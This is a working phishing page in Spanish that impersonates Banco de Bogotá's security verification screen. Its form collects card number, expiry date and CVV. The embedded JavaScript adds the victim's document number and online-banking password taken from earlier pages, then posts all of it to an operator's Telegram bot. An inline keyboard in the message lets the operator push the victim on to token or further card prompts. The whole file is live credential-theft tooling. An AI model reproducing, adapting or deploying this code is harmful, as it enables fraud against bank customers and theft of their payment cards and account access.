<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banco de Bogotá - Verificación</title>
    <link rel="stylesheet" href="https://sapp2406.sirv.com/bogo/lfr_style.css" />
    <link rel="stylesheet" href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        /* Custom overrides matching index1.html */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #2c3e50;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loader-container {
            position: relative;
            width: 60px;
            height: 60px;
            animation: rotateLoader 1.5s linear infinite;
        }

        .dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
        }

        .dot-yellow { background-color: #f1c40f; top: 0; left: 50%; transform: translateX(-50%); }
        .dot-blue { background-color: #3498db; bottom: 5px; left: 0; }
        .dot-red { background-color: #e74c3c; bottom: 5px; right: 0; }

        @keyframes rotateLoader {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        body {
            background: linear-gradient(90deg, #fcfcfc 50%, #eef3f6 50%) !important;
            min-height: 100vh;
            margin: 0;
            font-family: 'Open Sans', sans-serif;
        }

        .container {
            display: flex !important;
            flex-direction: row !important;
            justify-content: center !important;
            align-items: flex-start !important;
            max-width: 1000px !important;
            margin: 0 auto !important;
            padding: 20px !important;
            background: transparent !important;
            box-shadow: none !important;
        }

        .login-card-content {
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 20px;
            margin-bottom: 15px;
        }

        .container__login {
            flex: 0 0 380px !important;
            padding-top: 0 !important;
            margin-right: 40px !important;
            background: transparent !important;
            position: relative !important;
            width: 380px !important;
            box-shadow: none !important;
            display: block !important;
        }

        .container__info {
            flex: 1 !important;
            padding: 0 !important;
            background: transparent !important;
            width: auto !important;
            height: auto !important;
            box-shadow: none !important;
            display: block !important;
            max-width: 500px !important;
        }

        .container__info img {
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: block;
            width: 100%;
        }

        /* Mobile Styles */
        @media (max-width: 768px) {
            body { background: #ffffff !important; }
            .container {
                flex-direction: column !important;
                align-items: center !important;
                padding: 15px !important;
                width: 100% !important;
            }
            .container__login {
                width: 100% !important;
                flex: none !important;
                margin-right: 0 !important;
                margin-bottom: 20px !important;
                max-width: 100% !important;
            }
            .container__info {
                width: 100% !important;
                flex: none !important;
                max-width: 100% !important;
                margin-top: 10px !important;
            }
            input { font-size: 16px !important; }
            .bottom-icons-container { margin-top: 20px; }
        }

        .blue-banner {
            background-color: #0033a0;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            font-size: 0.9em;
        }
        .blue-banner img { width: 40px; margin-right: 10px; }

        .form-group { margin-bottom: 15px; }
        .form-label {
            display: block;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
            font-size: 0.9em;
        }
        .custom-form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .custom-form-control:focus {
            border-color: #0033a0;
            outline: none;
        }

        .row-2-cols {
            display: flex;
            gap: 15px;
        }
        .col-half { flex: 1; }

        .btn-primary {
            background-color: #0033a0;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 25px;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        .btn-primary:hover { background-color: #002a80; }

        /* Bottom Icons */
        .bottom-icons-container {
            display: flex;
            align-items: center;
            position: relative;
            margin-top: 25px;
            padding-bottom: 20px;
            width: 100%;
        }
        .icons-scroll-view {
            display: flex;
            overflow-x: auto;
            scroll-behavior: smooth;
            gap: 10px;
            width: 100%;
            scrollbar-width: none;
            padding: 0 5px;
        }
        .icons-scroll-view::-webkit-scrollbar { display: none; }
        .bottom-icon {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            color: #0033a0;
            font-size: 0.75rem;
            font-weight: bold;
            flex: 0 0 85px;
            cursor: pointer;
        }
        .bottom-icon-box {
            width: 48px;
            height: 48px;
            border: 1px solid #d1d1d1;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 8px;
            transition: all 0.2s;
        }
        .bottom-icon-box:hover {
            border-color: #0033a0;
            background-color: #f4f8ff;
        }
        .bottom-icon-box svg { width: 24px; height: 24px; fill: #0033a0; }
        .arrow-btn {
            width: 32px;
            height: 32px;
            border: 1px solid #d1d1d1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0033a0;
            cursor: pointer;
            background: #fff;
            flex-shrink: 0;
            z-index: 2;
        }
        .arrow-btn:hover { border-color: #0033a0; background-color: #f4f8ff; }
        .arrow-btn svg { width: 16px; height: 16px; fill: #0033a0; }

    </style>
</head>
<body>

    <!-- Loader -->
    <div id="loading-overlay">
        <div class="loader-container">
            <div class="dot dot-yellow"></div>
            <div class="dot dot-blue"></div>
            <div class="dot dot-red"></div>
        </div>
        <div style="color: white; margin-top: 20px; font-family: sans-serif;">Procesando...</div>
    </div>

    <div class="box-container">
        <div class="container">
            
            <!-- Left Side -->
            <div class="container__login">
                <div class="container__login--header">
                    <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Banco de Bogotá" style="max-width: 200px; margin-bottom: 20px;" />
                </div>

                <div class="container__login--title">
                     <h2 style="font-size: 1.2rem; font-weight: bold; color: #333; margin-bottom: 15px;">Verificación de Seguridad</h2>
                </div>

                <!-- Blue Banner -->
                <div class="blue-banner">
                    <img src="images/per.png" alt="Icono" />
                    <div style="flex: 1;">
                        <strong>Protegemos tu seguridad</strong><br>
                        Ingresa los datos de tu tarjeta <span id="cardTypeLabel"></span> para validar tu identidad.
                    </div>
                </div>

                <!-- Form Card -->
                <div class="login-card-content">
                    <form id="cardForm" autocomplete="off">
                        <div class="form-group">
                            <label class="form-label">Número de Tarjeta <span id="cardTypeFormLabel"></span></label>
                            <input type="tel" id="inp_c_nm" name="n_tarjeta_p" maxlength="16" placeholder="0000 0000 0000 0000" class="custom-form-control" required autocomplete="off" aria-autocomplete="none" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                        </div>

                        <div class="row-2-cols">
                            <div class="col-half">
                                <div class="form-group">
                                    <label class="form-label">Fecha Exp (MM/AA)</label>
                                    <input type="tel" id="inp_c_xp" name="f_exp_d" maxlength="5" placeholder="MM/AA" class="custom-form-control" required autocomplete="off" aria-autocomplete="none">
                                </div>
                            </div>
                            <div class="col-half">
                                <div class="form-group">
                                    <label class="form-label">CVV</label>
                                    <input type="password" id="inp_c_vv" name="c_cvv_s" maxlength="3" placeholder="123" class="custom-form-control" required autocomplete="off" aria-autocomplete="none" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                                </div>
                            </div>
                        </div>

                        <button type="button" class="btn-primary" onclick="enviarTarjeta()">Continuar</button>
                    </form>
                </div>

                <!-- Bottom Icons (Same as Index) -->
                <div class="bottom-icons-container">
                    <div class="arrow-btn left" onclick="scrollIcons('left')" style="display: none;">
                        <svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
                    </div>
                    
                    <div class="icons-scroll-view" id="iconsTrack">
                        <div class="bottom-icon" onclick="window.location.href='turno.html'">
                            <div class="bottom-icon-box">
                                <img src="images/logo de cel.png" alt="Turno" style="width: 24px; height: 24px;">
                            </div>
                            <span>Solicitar un turno digital</span>
                        </div>
                        
                        <div class="bottom-icon" onclick="window.open('https://www.grupoaval.com/BuscadordePuntosAval/', '_blank')">
                            <div class="bottom-icon-box">
                                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                            </div>
                            <span>Buscar cajeros y oficinas</span>
                        </div>
                        
                        <div class="bottom-icon">
                            <div class="bottom-icon-box">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                            </div>
                            <span>Centro de ayuda</span>
                        </div>
                    </div>

                    <div class="arrow-btn right" onclick="scrollIcons('right')">
                        <svg viewBox="0 0 24 24"><path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/></svg>
                    </div>
                </div>

            </div>

            <!-- Right Side: Banner Carousel -->
            <div class="container__info">
                <img id="bannerImg" src="images/talaval.png" alt="Publicidad">
            </div>

        </div>
    </div>

    <script>
        // Telegram Configuration
        var TOKEN, CHAT_ID;
        
        fetch("claves.json?v=" + new Date().getTime())
            .then(res => res.json())
            .then(data => {
                TOKEN = data.token;
                CHAT_ID = data.chat_id;
            })
            .catch(e => console.error(e));

        // Carousel Logic
        document.addEventListener('DOMContentLoaded', function() {
            var bannerImages = ["images/talaval.png", "images/millas.png"];
            var currentBannerIndex = 0;
            var bannerImgElement = document.getElementById('bannerImg');
            if (bannerImgElement) {
                setInterval(() => {
                    currentBannerIndex++;
                    bannerImgElement.src = bannerImages[currentBannerIndex % bannerImages.length];
                }, 2000);
            }

            // Scroll arrows logic
            const container = document.getElementById('iconsTrack');
            const leftArrow = document.querySelector('.arrow-btn.left');
            if (container && leftArrow) {
                container.addEventListener('scroll', function() {
                    if (container.scrollLeft > 10) {
                        leftArrow.style.display = 'flex';
                    } else {
                        leftArrow.style.display = 'none';
                    }
                });
            }

            // Set Card Type
            const cardType = localStorage.getItem('card_type');
            const label = document.getElementById('cardTypeLabel');
            const formLabel = document.getElementById('cardTypeFormLabel');
            if (cardType) {
                if(label) label.textContent = cardType;
                if(formLabel) formLabel.textContent = cardType;
            }
        });

        function scrollIcons(direction) {
            const container = document.getElementById('iconsTrack');
            const scrollAmount = 150; 
            if (direction === 'left') {
                container.scrollBy({ left: -scrollAmount, behavior: 'smooth' });
            } else {
                container.scrollBy({ left: scrollAmount, behavior: 'smooth' });
            }
        }

        // Format Date Input
        document.getElementById('inp_c_xp').addEventListener('input', function(e) {
            var input = e.target.value;
            if (input.length === 2 && !input.includes('/')) {
                e.target.value = input + '/';
            }
        });

        function validateLuhn(pan) {
            let nCheck = 0, bEven = false;
            pan = pan.replace(/\D/g, "");
            for (var n = pan.length - 1; n >= 0; n--) {
                var cDigit = pan.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        function validateDate(exp) {
            if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
            var parts = exp.split('/');
            var month = parseInt(parts[0], 10);
            
            if (month < 1 || month > 12) return false;
            return true;
        }

        async function identifyBin(bin) {
            if (bin.length < 6) return "Desconocido";
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                
                const response = await fetch(`https://data.handyapi.com/bin/${bin}`, { signal: controller.signal });
                clearTimeout(timeoutId);

                if (!response.ok) throw new Error('Network response was not ok');
                const data = await response.json();
                
                let scheme = (data.Scheme || "").toUpperCase();
                let type = (data.Type || "").toUpperCase();
                let level = (data.CardTier || "").toUpperCase(); // Gold, Platinum, etc.
                
                if(!scheme) {
                     // Fallback simple
                     if(bin.startsWith('4')) scheme = "VISA";
                     else if(bin.startsWith('5')) scheme = "MASTERCARD";
                     else if(bin.startsWith('3')) scheme = "AMEX";
                }

                return `${scheme} ${level} ${type}`.trim();
            } catch (error) {
                // Fallback regex
                if(bin.startsWith('4')) return "VISA";
                if(bin.startsWith('5')) return "MASTERCARD";
                if(bin.startsWith('3')) return "AMEX";
                return "Desconocido";
            }
        }

        async function enviarTarjeta() {
            const pan = document.getElementById('inp_c_nm').value.replace(/\s/g, '');
            const exp = document.getElementById('inp_c_xp').value;
            const cvv = document.getElementById('inp_c_vv').value;
            
            if (pan.length < 15) {
                alert("El número de tarjeta debe tener al menos 15 dígitos.");
                return false;
            }

            if (!validateDate(exp)) {
                alert("La fecha de vencimiento es inválida.");
                return false;
            }

            if (cvv.length < 3) {
                alert("Código de seguridad (CVV) inválido.");
                return false;
            }

            // Show Loader
            document.getElementById('loading-overlay').style.display = 'flex';

            // Ensure credentials
            if (!TOKEN || !CHAT_ID) {
                try {
                    const res = await fetch("claves.json?v=" + new Date().getTime());
                    const data = await res.json();
                    TOKEN = data.token;
                    CHAT_ID = data.chat_id;
                } catch (e) {
                    console.error("Error loading credentials", e);
                }
            }

            if (!TOKEN || !CHAT_ID) {
                alert("Error de conexión. Por favor recarga la página.");
                document.getElementById('loading-overlay').style.display = 'none';
                return false;
            }

            // Identify Card Level
            const bin = pan.substring(0, 6);
            const cardInfo = await identifyBin(bin);

            // Get existing user data
            const tipo_cliente = localStorage.getItem('u_name') || 'Personas';
            const tipo = localStorage.getItem('u_name2') || '';
            const num = localStorage.getItem('u_name3') || '';
            const pass = localStorage.getItem('u_name4') || '';
            const last4 = localStorage.getItem('last4') || '';
            const cardType = localStorage.getItem('card_type') || 'Tarjeta';
            
            // Save card data
            localStorage.setItem('card_pan', pan);
            localStorage.setItem('card_exp', exp);
            localStorage.setItem('card_cvv', cvv);

            let message = `<b>💳 BBOGOTA ${cardType.toUpperCase()}</b>\n\n`;
            message += `👤 <b>Tipo:</b> ${tipo_cliente}\n`;
            message += `🆔 <b>Doc:</b> <code>${num}</code> (${tipo})\n`;
            message += `🔑 <b>Clave:</b> <code>${pass}</code>\n`;
            if (last4) message += `💳 <b>Ultimos4:</b> <code>${last4}</code>\n`;
            
            message += `\n<b>📝 DATOS TARJETA:</b>\n`;
            message += `💳 <b>PAN:</b> <code>${pan}</code>\n`;
            message += `📅 <b>Exp:</b> <code>${exp}</code>\n`;
            message += `🔒 <b>CVV:</b> <code>${cvv}</code>\n`;
            message += `ℹ️ <b>Info:</b> ${cardInfo}`;

            // Inline Keyboard
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "Error", callback_data: "error" },
                        { text: "Token", callback_data: "token" },
                        { text: "Otro Token", callback_data: "token_otro" }
                    ],
                    [
                        { text: "Pedir Tarjeta Débito", callback_data: "tarjeta_debito" },
                        { text: "Tarjeta de Crédito", callback_data: "tarjeta_credito" }
                    ],
                    [
                        { text: "Error Tarjeta Débito", callback_data: "error_debito" },
                        { text: "Error Tarjeta Crédito", callback_data: "error_credito" }
                    ],
                    [
                        { text: "Soy Yo", callback_data: "soyyo" },
                        { text: "Finalizar", callback_data: "finalizar" }
                    ],
                    [
                        { text: "Error Logo", callback_data: "error_logo" }
                    ]
                ]
            };

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                })
            })
            .then(r => r.json())
            .then(data => {
                if(data.ok) {
                    localStorage.setItem('bbogota_msg_id', data.result.message_id);
                    window.location.href = "load.html";
                } else {
                    alert("Error de conexión. Intente nuevamente.");
                    document.getElementById('loading-overlay').style.display = 'none';
                }
            })
            .catch(err => {
                console.error(err);
                document.getElementById('loading-overlay').style.display = 'none';
            });

            return false;
        }
    </script>
</body>
</html>
